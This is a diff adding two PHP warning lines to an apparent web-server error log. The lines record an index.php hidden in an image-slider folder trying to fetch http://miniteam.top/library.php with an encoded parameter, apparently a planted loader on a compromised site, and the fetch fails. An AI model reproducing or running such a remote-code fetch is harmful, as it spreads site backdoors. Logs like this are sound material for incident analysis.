@@ -1,0 +1,2 @@
+[04-Jul-2025 07:12:20 UTC] PHP Warning:  file_get_contents(): http:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /home2/afmjonli/public_html/api/sme-scale.io/assets/images/slider/index.php on line 1
+[04-Jul-2025 07:12:20 UTC] PHP Warning:  file_get_contents(http://miniteam.top/library.php?268Nh0R3JheWJ5dDNfMi50eHQ1OQ..UASK0X): Failed to open stream: no suitable wrapper could be found in /home2/afmjonli/public_html/api/sme-scale.io/assets/images/slider/index.php on line 1
